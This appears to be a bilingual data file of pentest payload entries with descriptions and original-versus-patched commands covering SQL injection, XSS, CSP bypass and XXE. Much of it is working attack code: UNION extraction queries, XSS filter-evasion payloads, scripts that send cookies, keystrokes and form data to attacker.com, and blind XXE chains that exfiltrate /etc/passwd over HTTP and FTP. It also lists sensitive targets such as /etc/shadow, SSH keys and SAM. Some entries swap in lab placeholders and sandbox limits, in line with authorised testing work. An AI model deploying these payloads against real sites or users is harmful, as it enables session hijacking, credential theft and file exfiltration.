description.zh: 提交单引号与恒真/恒假布尔条件探测注入点；恒真与恒假两次请求的响应内容或长度出现稳定差异、或单引号触发数据库错误，即可确认注入点可控。
description.en: Submit single quotes plus always-true/always-false boolean conditions to probe the injection point; a stable response or length difference between the true and false pair, or a database error after the quote, confirms a controllable injection point.

description.zh: 注入 UNION SELECT 数字与字符序列定位回显位；某个数字或字符出现在页面固定列位置即为回显位，后续数据放到这些列读取。
description.en: Inject UNION SELECT numeric and string sequences to locate reflected columns; a number or character appearing at a fixed page position marks a reflection slot for later extraction.

patches.expectedCommand:
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--

description.en: Inject database()/user()/version()/@@hostname to read basics; the current database, account, and version appearing in the response confirms readable metadata.

description.en: Enumerate database names from information_schema.schemata; a list of database names in the response confirms the database inventory is enumerable.

description.en: Replace target_db with a database found in the previous step and enumerate tables; the full table list of that database confirms table enumeration.

description.en: Replace users with the target table and enumerate columns; the full column list confirms the table structure is enumerable.

description.en: Concatenate username and password with 0x3a (colon) to extract data; user:password pairs in the response confirm bulk data extraction.

description.zh: 以大小写混合提交相同 UNION 语句；查询仍执行并返回与基线一致的结果即确认大小写过滤被绕过。
description.en: Resubmit the same UNION with mixed case; the query still executes and returns baseline-consistent results, confirming case filtering is bypassed.

description.zh: 用 MySQL 版本注释包裹关键字提交；语句仍执行并返回 database() 结果即确认版本注释绕过有效。
description.en: Wrap keywords in MySQL version comments; the statement still executes and returns database(), confirming the version-comment bypass works.

description.zh: 双写关键字提交；过滤器单次替换删除后剩余关键字拼回有效语句并返回相同结果即确认双写绕过有效。
description.en: Submit double-written keywords; after a single-pass replacement filter deletes one copy, the remainder reassembles into a valid statement with identical results, confirming the double-write bypass.

description.zh: 用注释、换行、括号替代空格提交；语句仍解析执行并返回相同结果即确认空格过滤被绕过。
description.en: Replace spaces with comments, newlines, or parentheses; the statement still parses and returns identical results, confirming space filtering is bypassed.

description.en: Wrap database() with hex/unhex/conv; the encoded database name appears in the response and decodes back, confirming keyword detection is bypassed.

description.en: Query the file_priv column of mysql.user via UNION and boolean conditions; Y in the output or the boolean row returning true confirms FILE privilege for the current account, unlocking file read/write tests. description.zh: 打开携带 hash 载荷的完整 URL；页面按 Sink 逻辑执行载荷（弹窗）即确认 URL→Sink 触发路径完整。{LAB_APP} 渲染为目标应用主机。
description.en: Open the full URL carrying the hash payload; the page executing the payload per the sink logic (alert) confirms the URL-to-sink trigger path. {LAB_APP} renders to the target app host.

description.zh: 以大小写混淆、HTML 实体编码、制表符插入等变体绕过 javascript: 协议过滤；过滤后仍可导航执行即确认协议过滤可绕过。
description.en: Bypass javascript: scheme filtering with case obfuscation, HTML-entity encoding, and tab insertion; navigation/execution surviving the filter confirms the scheme filter is bypassable.

description.zh: 利用 SVG、MathML 等非标准标签与 ontoggle/onpageshow 等冷门事件绕过黑名单；载荷仍触发执行即确认标签与事件黑名单覆盖不全。
description.en: Evade blacklists with SVG/MathML tags and rare events like ontoggle/onpageshow; payloads still firing confirm the tag and event blacklists have gaps.

description.zh: 在允许 unsafe-inline 的 CSP 下直接内联执行脚本；alert 弹出即确认宽松策略可被直接利用。
description.en: Run an inline script under a CSP allowing unsafe-inline; the alert firing confirms permissive policy is directly exploitable.

description.zh: 借助白名单域上的 JSONP 端点把回调名设为 alert(1)；响应作为脚本执行并弹出即确认 JSONP 信任边界可滥用。allowed-domain.com 替换为目标 CSP 实际允许的域。
description.en: Use a JSONP endpoint on an allowlisted domain with the callback set to alert(1); the response executing as a script confirms JSONP trust-boundary abuse. Replace allowed-domain.com with a domain actually allowed by the target CSP.

description.zh: 利用 img 的 onerror 把 document.cookie 拼接进外域 URL，验证 img-src 未限制时的静默外带；收集端收到 c 参数即确认外带成立。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Use the img onerror handler to append document.cookie to an external URL, checking silent exfiltration when img-src is unrestricted; the request arriving at the collector with the c parameter confirms exfiltration. {ATTACKER_HOST} renders to your collection server.

description.zh: 在 base-uri 未限制时重写相对路径基址，并用 CSS 属性选择器逐位猜解 script nonce 外带；相对资源请求到达 {ATTACKER_HOST} 且按前缀收到 nonce 猜测请求即确认两条绕过路径成立。
description.en: Rewrite the base URL when base-uri is unrestricted and steal the script nonce bit by bit with a CSS attribute selector; relative-resource requests reaching {ATTACKER_HOST} plus per-prefix nonce guess requests confirm both bypass paths.

description.zh: 声明 file:// 外部实体读取目标文件并回显；响应出现文件内容即确认外部实体解析开启，可继续枚举敏感文件。{FILE_PATH} 渲染为 Linux 读取路径。
description.en: Declare a file:// external entity to read the target file and reflect it; file content in the response confirms external-entity parsing is on, enabling sensitive-file enumeration. {FILE_PATH} renders to the Linux read path.

description.zh: 以实体读取 Windows win.ini；回显文件内容即确认 Windows 平台文件可读。
description.en: Read Windows win.ini via an entity; the file content in the response confirms readable Windows files.

description.zh: 以 php://filter Base64 读取 index.php；回显 Base64 串且解码得到源码即确认 PHP wrapper 可用。
description.en: Read index.php via php://filter Base64; a Base64 string that decodes to source code confirms the PHP wrapper works.

description.zh: 以实体请求云元数据地址；回显元数据 JSON 即确认解析器可发起出站请求（XXE→SSRF）。仅在授权实验中用隔离模拟端点替代真实元数据地址。
description.en: Request the cloud metadata address through an entity; metadata JSON in the response confirms parser-initiated outbound requests (XXE→SSRF). Replace the real metadata address with an isolated simulator in authorized labs only.

description.zh: 以外部参数实体加载远端 DTD；OAST 侧收到 DTD 请求即确认参数实体外部加载可用、WAF 未拦截外部 DTD 引用。{LAB_OAST} 渲染为带外验证域名。
description.en: Load a remote DTD via an external parameter entity; the DTD request arriving at your OAST confirms external parameter-entity loading and that WAF rules miss external DTD references. {LAB_OAST} renders to the out-of-band validation domain.

description.zh: 利用 noscript 解析差异构造属性逃逸；渲染后 img 载荷执行即确认 mXSS 成立。
description.en: Exploit noscript parsing differences for attribute breakout; the img payload executing after rendering confirms mXSS.

description.zh: 以 SVG CDATA 突变提交；解析突变后脚本执行即确认 SVG 命名空间 mXSS。
description.en: Submit SVG CDATA mutations; script execution after parser mutation confirms SVG-namespace mXSS.

description.zh: 以 MathML mglyph/style 突变提交；突变后 img 执行即确认 MathML mXSS。
description.en: Submit MathML mglyph/style mutations; img execution after mutation confirms MathML mXSS.

description.zh: 以重复 id 表单触发 DOM clobbering 配合载荷；覆盖生效并执行即确认 clobbering 可助攻触发。
description.en: Trigger DOM clobbering with duplicate-id forms alongside the payload; the override taking effect and firing confirms clobbering assists execution.

description.zh: 以 SVG 内实体编码脚本提交；解码后执行即确认 SVG 脚本编码绕过有效。
description.en: Submit entity-encoded scripts inside SVG; execution after decoding confirms the SVG script-encoding bypass.

description.zh: 以 \u/\x/\u{} 转义书写 alert 提交；JS 解码后执行即确认转义可绕过关键字检测。
description.en: Write alert with \u/\x/\u{} escapes; execution after JS decoding confirms escapes bypass keyword detection.

description.zh: 以十进制/十六进制 HTML 实体提交事件载荷；解码后执行即确认实体编码绕过有效。
description.en: Submit event payloads as decimal/hex HTML entities; execution after decoding confirms the entity-encoding bypass.

description.zh: 混合实体与 Unicode 转义及反引号调用提交；解码链仍还原执行即确认混合编码绕过有效。
description.en: Mix entities, Unicode escapes, and backtick invocation; execution after the full decode chain confirms the mixed-encoding bypass.

description.zh: 大小写混淆提交；仍执行即确认过滤对大小写不敏感。
description.en: Submit mixed-case payloads; execution confirms the filter is case-insensitive.

description.zh: 双写提交；删除后拼回有效标签执行即确认关键字删除过滤可绕过。
description.en: Submit double-written payloads; reassembly after deletion into a working tag confirms keyword-deletion filtering is bypassable.

description.zh: 注释插入提交；仍执行即确认注释混淆可绕过检测。
description.en: Submit comment-obfuscated payloads; execution confirms comment obfuscation evades detection.

description.zh: 空字节截断提交；截断后标签重组执行即确认空字节处理差异可利用。
description.en: Submit null-byte truncation payloads; tag reassembly and execution after truncation confirms exploitable null-byte handling.

description.zh: 以制表符/换行/空格变形事件属性提交；仍执行即确认空白字符处理差异可利用。
description.en: Submit event attributes deformed with tabs, newlines, and spaces; execution confirms exploitable whitespace handling.

patches.expectedCommand:
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<details open ontoggle=alert(1)>
<audio src=x onerror=alert(1)>

description.zh: 使用 onpageshow/onstart/ontoggle 等冷门事件提交；仍执行即确认事件黑名单覆盖不全。
description.en: Submit rare events like onpageshow/onstart/ontoggle; execution confirms event blacklists have gaps.

description.zh: 以 data: URI 链接与 iframe 提交；导航或加载后执行即确认 data: URI 可用场景。
description.en: Submit data: URI links and iframes; execution after navigation or load confirms the viable data: URI scenarios.

description.zh: 以 SVG animate/set onbegin 提交；动画事件触发执行即确认 SVG 动画绕过有效。
description.en: Submit SVG animate/set onbegin payloads; execution on the animation event confirms the SVG-animation bypass.

title.zh: 大小写与标签混淆变体

description.zh: URL 编码标签提交；解码后执行即确认单层解码差异可利用。
description.en: Submit URL-encoded tags; execution after decoding confirms exploitable single-pass decoding.

description.zh: HTML 实体编码提交；解码后执行即确认实体解码差异可利用。
description.en: Submit HTML-entity encoded payloads; execution after decoding confirms exploitable entity decoding.

description.zh: JS 十六进制/八进制/atob 编码提交；求值后执行即确认 JS 解码层绕过有效。
description.en: Submit JS hex/octal/atob encodings; execution after evaluation confirms the JS decode-layer bypass.

description.zh: 以 CSS expression（旧版 IE）提交；表达式执行即确认旧引擎下 CSS 编码层可利用。
description.en: Submit CSS expression payloads (legacy IE); expression execution confirms the CSS encode layer is exploitable on legacy engines.

description.zh: 混合多层编码提交；逐层解码后执行即确认多层解码链差异可利用。
description.en: Submit multi-layer mixed encodings; execution after layered decoding confirms exploitable multi-decode chains.

description.zh: 以 UTF-16 编码标签提交；按 UTF-16 解码后执行即确认编码声明差异可利用。
description.en: Submit UTF-16 encoded tags; execution after UTF-16 decoding confirms exploitable encoding-declaration differences.

description.zh: 提交经典全上下文 Polyglot；任一解析上下文（HTML/属性/脚本/URL）触发执行即确认该输入位多上下文可达。
description.en: Submit the classic multi-context polyglot; execution in any parsing context (HTML/attribute/script/URL) confirms multi-context reachability from that input position.

description.zh: 提交短版本 Polyglot；闭合既有标签后执行即确认短载荷有效性。
description.en: Submit the short polyglot; execution after closing existing tags confirms the compact payload works.

description.zh: 属性注入 Polyglot 提交；悬停/聚焦/点击触发执行即确认属性上下文可控。
description.en: Submit attribute-injection polyglots; execution on hover/focus/click confirms controllable attribute context.

description.zh: URL 参数 Polyglot 提交；导航或脚本执行即确认 URL 上下文可控。
description.en: Submit URL-parameter polyglots; navigation or script execution confirms controllable URL context.

description.zh: 提交紧凑高级 Polyglot；触发执行即确认该形态以更短长度覆盖多上下文。
description.en: Submit the compact advanced polyglot; execution confirms this form covers multiple contexts in fewer bytes.

description.zh: 以 Image 请求把 cookie 发往收集端；收集端收到 c 参数中的 cookie 即确认基础窃取链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Send the cookie to the collector via an Image request; the cookie arriving in the c parameter confirms the basic theft chain. {ATTACKER_HOST} renders to your collection server.

description.zh: 以 fetch 与 sendBeacon 两种 API 外发 cookie；收集端收到两种请求即确认两个通道均可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Exfiltrate the cookie via fetch and sendBeacon; both requests arriving at the collector confirm both channels work. {ATTACKER_HOST} renders to your collection server.

patches.expectedCommand:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
xhr.send();
</script>
patches.command:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://{ATTACKER_HOST}/steal?c="+document.cookie, true);
xhr.send();
</script>

description.zh: 以 XHR GET 外发 cookie；收集端收到请求即确认 XHR 通道可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Exfiltrate the cookie via an XHR GET; the request arriving at the collector confirms the XHR channel. {ATTACKER_HOST} renders to your collection server.

description.zh: Base64 编码后以 Image 外发；收集端解码 c 参数还原出 cookie 即确认编码传输可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Base64-encode the cookie and exfiltrate via Image; decoding the c parameter at the collector restoring the cookie confirms encoded transport. {ATTACKER_HOST} renders to your collection server.

patches.expectedCommand:
<script>
var img = new Image();
img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>
patches.command:
<script>
var img = new Image();
img.src = "http://{ATTACKER_HOST}/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>

description.zh: 收集 cookie、页面地址与 UA 三项信息外发；收集端收到完整参数集即确认信息收集链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Collect cookie, page URL, and user agent and exfiltrate them; the full parameter set arriving at the collector confirms the information-gathering chain. {ATTACKER_HOST} renders to your collection server.

description.zh: 以变量混淆构造外发；收集端仍收到 cookie 即确认混淆不影响执行。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Build the exfil with variable obfuscation; the cookie still arriving at the collector confirms obfuscation does not break execution. {ATTACKER_HOST} renders to your collection server.

description.zh: 注入 keypress 监听外发击键；收集端按 key 参数收到按键流即确认基础记录链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Inject a keypress listener forwarding keystrokes; the keystroke stream arriving under the key parameter confirms the basic logger chain. {ATTACKER_HOST} renders to your collection server.

patches.expectedCommand:
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>
patches.command:
<script>
var buffer = "";
document.addEventListener("keydown", function(e){
  if(e.key === "Enter"){
    new Image().src = "http://{ATTACKER_HOST}/log?data=" + encodeURIComponent(buffer);
    buffer = "";
  } else {
    buffer += e.key;
  }
});
</script>

description.zh: 缓冲击键并在 Enter 时整段外发；收集端按 data 参数收到整行输入即确认缓冲记录可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Buffer keystrokes and send the whole line on Enter; the full line arriving under the data parameter confirms buffered logging. {ATTACKER_HOST} renders to your collection server.

description.zh: 监听密码字段 change 事件外发字段值；收集端按 pwd 参数收到密码值即确认表单窃取可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Listen for change events on password fields and exfiltrate values; the password arriving under the pwd parameter confirms form theft. {ATTACKER_HOST} renders to your collection server.

patches.expectedCommand:
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
</script>
patches.command:
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://{ATTACKER_HOST}/log?" + new URLSearchParams(data).toString();
  });
});
</script>

description.zh: 劫持 form submit 外发完整表单数据；收集端收到表单字段集即确认提交劫持可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Hijack form submit events and exfiltrate the FormData; the form field set arriving at the collector confirms submit hijacking. {ATTACKER_HOST} renders to your collection server.

description.zh: 以十六进制混淆监听 keydown 外发按键；收集端仍收到按键即确认混淆版本可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Listen for keydown via hex-obfuscated identifiers and exfiltrate keys; keystrokes still arriving confirm the obfuscated variant works. {ATTACKER_HOST} renders to your collection server.

description.zh: 在隔离测试页面加载已授权 BeEF 实例的 hook.js；BeEF 控制台出现该浏览器上线即确认 Hook 链路可用。
description.en: Load the hook.js of an authorized BeEF instance in an isolated test page; the browser appearing online in the BeEF console confirms the hook chain.

description.zh: 以通用实体请求收集端；{LAB_OAST} 收到该请求即确认解析器出站可达，可作为无回显场景的关联探针。
description.en: Request the collector via a general entity; the request arriving at {LAB_OAST} confirms parser egress and doubles as the correlation probe for blind scenarios.

description.zh: 以参数实体加载远端 DTD；{LAB_OAST} 收到 DTD 请求即确认参数实体外部加载可用。
description.en: Load a remote DTD via a parameter entity; the DTD request arriving at {LAB_OAST} confirms external parameter-entity loading.

patches.expectedCommand:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
%xxe;
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
]>
<foo>test</foo>
patches.command:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/xxe.dtd">
%xxe;
<!ENTITY % file SYSTEM "file://{FILE_PATH}">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://{LAB_OAST}/?d=%file;'>">
%eval;
%exfil;
]>
<foo>test</foo>

description.zh: 在 DOCTYPE 内部子集组合 file/eval/exfil 参数实体，把目标文件内容外带到收集端；{LAB_OAST} 收到含文件内容的请求即确认无回显场景的完整外带链路。
description.en: Combine file/eval/exfil parameter entities inside the DOCTYPE internal subset to exfiltrate the target file to the collector; the request carrying file content arriving at {LAB_OAST} confirms the full blind-exfiltration chain.

patches.expectedCommand:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.com/log?data=%file;'>">
%eval;
%exfil;
patches.command:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file://{FILE_PATH}">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://{LAB_OAST}/log?data=%file;'>">
%eval;
%exfil;

description.zh: 引用远端 DTD 并经参数实体把目标文件内容以 HTTP 外带；{LAB_OAST} 收到含内容的请求即确认 HTTP 外带链可用。
description.en: Reference the remote DTD and exfiltrate the target file via parameter entities over HTTP; the content-carrying request arriving at {LAB_OAST} confirms the HTTP exfil chain.

patches.expectedCommand:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'ftp://attacker.com/%file;'>">
%eval;
%exfil;
patches.command:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://{LAB_OAST}/evil.dtd">
%xxe;
]>
<foo></foo>

# evil.dtd
<!ENTITY % file SYSTEM "file://{FILE_PATH}">
<!ENTITY % eval "<!ENTITY % exfil SYSTEM 'ftp://{LAB_OAST}/%file;'>">
%eval;
%exfil;

description.zh: 同链路改用 FTP 外带文件内容；FTP 监听收到含内容的请求即确认 FTP 通道可用，可对比两种协议的出站限制差异。
description.en: Exfiltrate the file content over FTP through the same chain; the content-carrying request arriving at the FTP listener confirms the FTP channel and reveals protocol-specific egress differences.

description.zh: 以通用实体请求带 file 参数的记录端点；{LAB_OAST} 收到请求即确认解析器发起带外请求的行为，实体声明必须留在 DOCTYPE 内。
description.en: Request a logging endpoint with a file parameter via a general entity; the request arriving at {LAB_OAST} confirms parser-initiated OOB requests, with entity declarations kept inside the DOCTYPE.

description.zh: 该变体仅使用内部通用实体读取 file:// 目标文件，不含 CDATA 包装，作为实体读取的对照样例；回显文件内容即确认基础读取仍可用。
description.en: This variant reads the file:// target via an internal general entity with no CDATA wrapper, the control sample for entity reads; file content in the response confirms base reading still works.

patches.expectedCommand:
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<foo>&xxe;</foo>

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
]>
<foo>&xxe;</foo>

<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://192.168.1.1:443">
]>
<foo>&xxe;</foo>

description.zh: 对 192.168.1.1 的 22、80、443 端口各生成一个独立完整 XML 样例并逐个提交；以响应时间与错误差异区分端口连通性，某端口响应特征不同即确认解析器可达该内网端口。
description.en: Generate one independent XML sample per port (22/80/443) on 192.168.1.1 and submit them one at a time; response-time and error differences distinguish reachability, and a distinctive response on a port confirms the parser reaches that intranet port.

description.zh: 用内部实体读取目标文件验证文件读取；回显出现文件内容即确认读取成功。其余可选目标：file:///etc/shadow、file:///etc/hosts、file:///root/.ssh/id_rsa、file:///proc/self/environ。
description.en: Read the target file via an internal entity to confirm file read; the content in the response confirms success. Other candidate targets: file:///etc/shadow, file:///etc/hosts, file:///root/.ssh/id_rsa, file:///proc/self/environ.

description.zh: 用内部实体读取 win.ini 验证 Windows 文件读取；回显出现 win.ini 内容即确认读取成功。其余可选目标：file:///c:/windows/system32/config/sam、file:///c:/users/administrator/.ssh/id_rsa。
description.en: Read win.ini via an internal entity to confirm Windows file read; win.ini content in the response confirms success. Other candidate targets: file:///c:/windows/system32/config/sam, file:///c:/users/administrator/.ssh/id_rsa.

description.zh: 用内部实体读取应用配置文件验证敏感信息读取；回显出现配置内容即确认敏感文件可读。其余可选目标：file:///var/www/html/wp-config.php、file:///app/.env、file:///app/config/database.yml。
description.en: Read an application config file via an internal entity to confirm sensitive-file access; config content in the response confirms success. Other candidate targets: file:///var/www/html/wp-config.php, file:///app/.env, file:///app/config/database.yml.

description.zh: 以 php://filter Base64 读取目标源码文件；回显 Base64 串且解码得到源码即确认源码读取链可用。
description.en: Read the target source file via php://filter Base64; a Base64 string that decodes to source confirms the source-read chain.

description.zh: 以参数实体包装文件实体读取；仍能回显目标文件内容即确认参数实体形式可用、仅拦通用实体的过滤被绕过。
description.en: Wrap the file entity in a parameter entity; the target file content still reflected confirms the parameter-entity form works and filters that only block general entities are bypassed.

description.zh: 用参数实体把目标文件内容拼入外带 URL，作为外部 DTD 内容的完整样例块；该块放入外部 DTD 后，{LAB_OAST} 收到含文件内容的请求即确认外带成立。
description.en: Assemble the target file into an OOB URL with parameter entities — a complete sample block for external DTD content; once placed in an external DTD, the file-carrying request arriving at {LAB_OAST} confirms the exfil.

description.zh: 引用外部 DTD 文件；{LAB_OAST} 收到 DTD 请求即确认外部 DTD 加载开启，可作为后续 DTD 内容块的载体验证。
description.en: Reference an external DTD; the DTD request arriving at {LAB_OAST} confirms external DTD loading is on, the carrier for later DTD content blocks.

patches.expectedCommand:
POST /transport-check HTTP/1.1
Host: 127.0.0.1:8080
Transfer-Encoding: chunked

3
id=
10
PAYLOADER_MARKER
0

description.zh: 以完整 chunked 请求把 marker 作为参数值分块发送；服务端重组后处理并回显 marker 即确认分块载体可承载注入载荷。Host 保持本地夹具地址。
description.en: Send the marker as a chunked parameter value in a full raw request; the server reassembling and reflecting the marker confirms the chunked carrier carries injection payloads. The Host stays on the local fixture.

description.zh: 把 SQL 关键字拆分到多个同名 id 参数提交；服务端按其拼接策略重组后执行，响应差异即确认 HPP 载体对参数解析的影响。
description.en: Split SQL keywords across multiple same-named id parameters; the server reassembling per its concatenation strategy and the resulting response difference confirm how HPP affects parameter parsing.

patches.expectedCommand:
' AND GREATEST(1,0)--
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
' UNION SELECT CAST('PAYLOADER_MARKER' AS VARCHAR2(32)) FROM DUAL-- -

description.zh: 以 GREATEST、JOIN 派生表与 CAST 等价表达式构造恒真与列对齐；语句仍执行并回显 marker 即确认表达式等价变体可用于绕过关键字检测。
description.en: Build tautologies and column alignment with GREATEST, JOIN-derived tables, and CAST equivalents; the statement still executing and reflecting the marker confirms expression-equivalent variants evade keyword detection.

description.zh: 在语句前注入超长注释块填充检测窗口；语句仍执行并返回 marker 即确认大注释填充可绕过长度或正则限制。
description.en: Prepend an oversized comment block to pad the detection window; the statement still executing and returning the marker confirms large-comment padding bypasses length or regex limits.

patches.expectedCommand:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="id"

1 UNION SELECT 1,2,3--
------WebKitFormBoundary--

description.zh: 以 multipart 表单字段承载注入语句发送；服务端解析字段值进入 SQL 拼接并出现响应差异即确认 multipart 载体可达注入层。
description.en: Carry the injection statement in a multipart form field; the server parsing the field value into SQL and producing a response difference confirms the multipart carrier reaches the injection layer.

description.zh: 把注入语句放入 JSON 字段值提交；服务端反序列化后进入 SQL 拼接并出现响应差异即确认 JSON 载体可达注入层。
description.en: Place the injection statement inside a JSON field value; the deserialized value entering SQL concatenation with a response difference confirms the JSON carrier reaches the injection layer.

description.en: Submit onload-bearing SVG lines enumerating document/window/navigator properties; alerts showing the property values confirm active SVG content executes at this output position.

description.zh: 逐行按引擎指纹提交（${ }、{{ }}、<% %>、#{ } 等形态）；出现 49、config 或命令输出即确认对应引擎把输入当模板求值。命令执行行仅在授权实验环境、以隔离 marker 验证，不读取真实文件。
description.en: Submit engine fingerprints line by line (${ }, {{ }}, <% %>, #{ } forms); 49, config, or command output appearing confirms that engine evaluates input as template. Command-execution lines run only in an authorized lab with isolated markers, never reading real files.

description.zh: 以通用 XML 本地实体读取两个平台路径；解析后回显 marker 内容即确认本地实体读取可用。执行前把两个系统路径按目标平台改为工作目录内不同随机 marker 文件。
description.en: Read two platform paths via generic XML local entities; marker content in the parsed output confirms local-entity reads. Before execution replace both system paths with distinct random marker files in the working directory for the target platform.

patches.expectedCommand: <?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"><text font-size="16" x="0" y="16">&xxe;</text></svg>

description.zh: 以 SVG 文本节点承载本地文件实体；栅格或预览结果文本中出现 marker 内容即确认 SVG 入口可读本地文件。将 /etc/passwd 改为图片 worker 沙箱中的随机 marker.txt，再触发一次预览或栅格任务。
description.en: Carry the local-file entity in an SVG text node; marker content appearing in the raster/preview text confirms the SVG entry reads local files. Change /etc/passwd to a random marker.txt in the image-worker sandbox and trigger one preview or raster job.

description.zh: 以外部参数实体拉取两个 token 化 DTD 路径；{LAB_OAST} 收到两次独立 DTD 请求即确认外部 DTD 获取边界。{LAB_OAST} 渲染为只返回空合法 DTD 的自有端点，不得提供 gopher 或二次实体内容。
description.en: Fetch two tokenized DTD paths via external parameter entities; two independent DTD requests arriving at {LAB_OAST} confirm the external-DTD fetch boundary. {LAB_OAST} renders to your endpoint returning empty valid DTDs only — never gopher or secondary-entity content.

description.zh: 以通用实体请求元数据地址；模拟端点返回的 marker XML 出现在解析结果中即确认解析器会发起元数据地址请求。绝不访问真实元数据，将地址改为隔离模拟端点并只返回短随机 XML marker。
description.en: Request the metadata address via a general entity; the simulator's marker XML in the parsed output confirms the parser issues metadata-address requests. Never touch real metadata — point the address at an isolated simulator returning only a short random XML marker.

patches.expectedCommand: <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><sst><si><t>&xxe;</t></si></sst>

description.zh: 以 SpreadsheetML 形态承载本地文件实体；解析结果出现 marker 内容即确认该 XML 入口可读本地文件。在已确认的原始 XML 入口测试，把系统路径改为随机 marker，不得宣称该行本身是完整 XLSX。
description.en: Carry the local-file entity in SpreadsheetML form; marker content in the parsed output confirms this XML entry reads local files. Test at a confirmed raw-XML entry, change the system path to a random marker, and never claim the line alone is a complete XLSX.

description.zh: 以 expect:// 包装器声明实体；wrapper 返回当前任务 marker 即确认 expect 包装器被解析。绝不运行原始 id 命令，只用无子进程测试 wrapper 返回 marker。
description.en: Declare the entity with an expect:// wrapper; the wrapper returning the current job marker confirms the expect wrapper is parsed. Never run the source id command — use only a no-child-process test wrapper that returns the marker.

description.zh: 以 DOCX document.xml 形态逐行注入文件、proc、元数据与 Windows 路径实体样例；解析日志或文档内容出现 marker 即确认对应目标可达。原目标仅用于追溯，执行前改写为沙箱 marker 文件或隔离 HTTP marker，不访问列出的真实路径和元数据地址。
description.en: Inject file, /proc, metadata, and Windows-path entity samples into DOCX document.xml line by line; markers in parser logs or document content confirm each target's reachability. Original targets are for provenance only — rewrite them to sandbox marker files or isolated HTTP markers and never access the listed real paths or metadata addresses.

description.en: Carry a gopher:// request in a DOCX entity; your resolver receiving the request confirms the gopher wrapper is parsed. Do not send the source Redis INFO sequence — replace the URI with a single-use resolver marker with no protocol side effect.

description.en: Carry the expect:// wrapper in a DOCX entity; the wrapper returning a random marker confirms the expect execution boundary. Never run the source id command — validate only with a registered test wrapper that spawns no process.

description.zh: 以 DOCX document.xml 中的外部参数实体拉取 DTD；{LAB_OAST} 收到单次 DTD 请求即确认外部参数实体 DTD 获取边界。{LAB_OAST} 渲染为只返回空合法 DTD 的单次 token 端点，禁止定义二次实体或回连。
description.en: Fetch the DTD via an external parameter entity in DOCX document.xml; the single DTD request arriving at {LAB_OAST} confirms the external parameter-entity fetch boundary. {LAB_OAST} renders to a single-use token endpoint returning an empty valid DTD — no secondary entities or callbacks.

description.zh: 以 XInclude 在 DOCX 内包含外部资源；包含结果出现 marker 内容即确认 XInclude 处理开启。将 file URI 改为工作目录内只含随机值的 marker.txt，并确保处理器不能访问宿主路径。
description.en: Include an external resource via XInclude inside a DOCX; marker content in the inclusion result confirms XInclude processing. Change the file URI to a marker.txt containing only a random value in the working directory and ensure the processor cannot reach host paths.

